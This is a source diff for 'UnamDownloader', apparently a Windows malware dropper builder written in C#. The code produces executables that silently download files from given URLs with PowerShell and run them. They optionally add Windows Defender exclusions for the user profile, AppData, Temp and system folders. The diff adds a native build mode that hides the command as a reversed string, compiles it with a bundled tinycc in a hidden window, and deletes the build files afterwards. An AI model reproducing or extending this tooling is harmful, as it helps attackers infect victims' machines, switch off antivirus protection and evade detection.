@@ -4,6 +4,8 @@ using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.IO.Compression;
+using System.Linq;
 using System.Text;
 using System.Windows.Forms;
 
@@ -19,23 +21,24 @@ namespace UnamDownloader
             InitializeComponent();
         }
 
-        public void DownloaderCompiler(string savePath)
+        private void Form1_Load(object sender, EventArgs e)
         {
-            if(savePath.Length == 0)
-            {
-                MessageBox.Show("Save path cannot be empty!", "Incorrect build!", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                return;
-            }
+            radioNative.Checked = true;
+        }
 
+        public void ManagedCompiler(string savePath)
+        {
             var providerOptions = new Dictionary<string, string>();
-            providerOptions.Add("CompilerVersion", "v3.5");
+            providerOptions.Add("CompilerVersion", "v4.0");
             CompilerParameters parameters = new CompilerParameters();
-            string compilerOptions = " /target:winexe /platform:AnyCPU /optimize ";
+            string compilerOptions = " /target:winexe /platform:AnyCPU /optimize+ ";
 
             StringBuilder loaderbuilder = new StringBuilder(Properties.Resources.Program);
 
             if (checkAdmin.Checked)
             {
+                System.IO.File.WriteAllBytes(savePath + ".manifest", Properties.Resources.administrator);
+                compilerOptions += " /win32manifest:\"" + savePath + ".manifest" + "\"";
                 loaderbuilder.Replace("DefAdmin", "true");
             }
 
@@ -51,25 +54,7 @@ namespace UnamDownloader
             parameters.ReferencedAssemblies.Add("System.dll");
             parameters.ReferencedAssemblies.Add("System.Core.dll");
 
-            List<string> downloads = new List<string>();
-            List<string> executes = new List<string>();
-
-            int count = listFiles.Items.Count;
-            for (int i = 0; i < count; i++)
-            {
-                File filevar = ((File)listFiles.Items[i]);
-                string droplocation = filevar.comboDropLocation.Text == "Current Directory" ? "%cd%" : "%" + filevar.comboDropLocation.Text + "%";
-                downloads.Add(string.Format(@"powershell (New-Object System.Net.WebClient).DownloadFile('{0}', '{1}')", filevar.txtDownloadURL.Text, Path.Combine(droplocation, filevar.txtFilename.Text)));
-                if (filevar.toggleExecute.Checked)
-                {
-                    executes.Add(string.Format(@"powershell Start-Process -FilePath '{0}'", Path.Combine(droplocation, filevar.txtFilename.Text)));
-                }
-            }
-
-            string exclusions = "powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & ";
-
-            loaderbuilder.Replace("#DATA", Convert.ToBase64String(Encoding.ASCII.GetBytes(@"/c " + (checkWD.Checked ? exclusions : "") + string.Join(" & ", downloads.ToArray()) + (executes.Count > 0 ? " & " + string.Join(" & ", executes.ToArray()) : "") + " & exit")));
-            loaderbuilder.Replace("#CMD", Convert.ToBase64String(Encoding.ASCII.GetBytes("cmd")));
+            loaderbuilder.Replace("#DATA", Convert.ToBase64String(Encoding.ASCII.GetBytes(CreateCommand())));
             loaderbuilder.Replace("DefDebug", "false");
             loaderbuilder.Replace("%Guid%", Guid.NewGuid().ToString());
 
@@ -96,9 +81,60 @@ namespace UnamDownloader
                     MessageBox.Show(error.ToString(), "Error when building downloader!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
             }
+            if (checkAdmin.Checked)
+            {
+                System.IO.File.Delete(savePath + ".manifest");
+            }
         }
 
-        public static string RandomString(int length)
+        public void NativeCompiler(string savePath)
+        {
+            string currentDirectory = Path.GetDirectoryName(savePath);
+            string filename = Path.GetFileNameWithoutExtension(savePath) + ".c";
+            using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.tinycc)))
+            {
+                archive.ExtractToDirectory(currentDirectory);
+            }
+            if (checkAdmin.Checked)
+            {
+                System.IO.File.WriteAllBytes(Path.Combine(currentDirectory, "manifest.o"), Properties.Resources.manifest);
+            }
+            System.IO.File.WriteAllText(Path.Combine(currentDirectory, filename), Properties.Resources.Program1.Replace("#COMMAND", ReverseString("cmd " + CreateCommand())));
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = Path.Combine(currentDirectory, "tinycc/tcc"),
+                Arguments = "-Wall -Wl,-subsystem=windows \"" + filename + "\" " + (checkAdmin.Checked ? "manifest.o" : "") + " -luser32",
+                WindowStyle = ProcessWindowStyle.Hidden,
+            }).WaitForExit();
+            System.IO.File.Delete(Path.Combine(currentDirectory, "manifest.o"));
+            System.IO.File.Delete(Path.Combine(currentDirectory, filename));
+            Directory.Delete(Path.Combine(currentDirectory, "tinycc"), true);
+        }
+
+        public string CreateCommand()
+        {
+            List<string> downloads = new List<string>();
+            List<string> executes = new List<string>();
+
+            int count = listFiles.Items.Count;
+            for (int i = 0; i < count; i++)
+            {
+                File filevar = ((File)listFiles.Items[i]);
+                string droplocation = filevar.comboDropLocation.Text == "Current Directory" ? "%cd%" : "%" + filevar.comboDropLocation.Text + "%";
+                downloads.Add(string.Format(@"powershell (New-Object System.Net.WebClient).DownloadFile('{0}', '{1}')", filevar.txtDownloadURL.Text, Path.Combine(droplocation, filevar.txtFilename.Text)));
+                if (filevar.toggleExecute.Checked)
+                {
+                    executes.Add(string.Format(@"powershell Start-Process -FilePath '{0}'", Path.Combine(droplocation, filevar.txtFilename.Text)));
+                }
+            }
+
+            string[] exclusions = { "powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%'", "powershell -Command Add-MpPreference -ExclusionPath '%AppData%'", "powershell -Command Add-MpPreference -ExclusionPath '%Temp%'", "powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%'" };
+            string[] randomexclusions = exclusions.OrderBy(x => random.Next()).ToArray();
+
+            return ("/c " + (checkWD.Checked ? string.Join(" & ", randomexclusions) + " & " : "") + string.Join(" & ", downloads.ToArray()) + (executes.Count > 0 ? " & " + string.Join(" & ", executes.ToArray()) : "") + " & exit").Replace(@"\", @"\\").Replace("\"", "\\\"");
+        }
+
+        public string RandomString(int length)
         {
             const string chars = "abcdefghijklmnpqrstuvwxyz";
             const int clength = 25;
@@ -110,7 +146,15 @@ namespace UnamDownloader
             return new string(buffer);
         }
 
-        public static string SaveDialog(string filter)
+        public string ReverseString(string text)
+        {
+            if (text == null) return null;
+            char[] array = text.ToCharArray();
+            Array.Reverse(array);
+            return new String(array);
+        }
+
+        public string SaveDialog(string filter)
         {
             SaveFileDialog dialog = new SaveFileDialog();
             dialog.Filter = filter;
@@ -159,15 +203,28 @@ namespace UnamDownloader
                 return;
             }
             string save = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");
+
             if (save.Length > 0)
             {
-                DownloaderCompiler(save);
+                if (radioNative.Checked)
+                {
+                    NativeCompiler(save);
+                }
+                else
+                {
+                    ManagedCompiler(save);
+                }
             }
         }
 
         private void btnVanity_Click(object sender, EventArgs e)
         {
             vanity.Show();
+        }
+
+        private void radioNative_CheckedChanged(object sender)
+        {
+            btnVanity.Visible = !radioNative.Checked;
         }
     }
 }
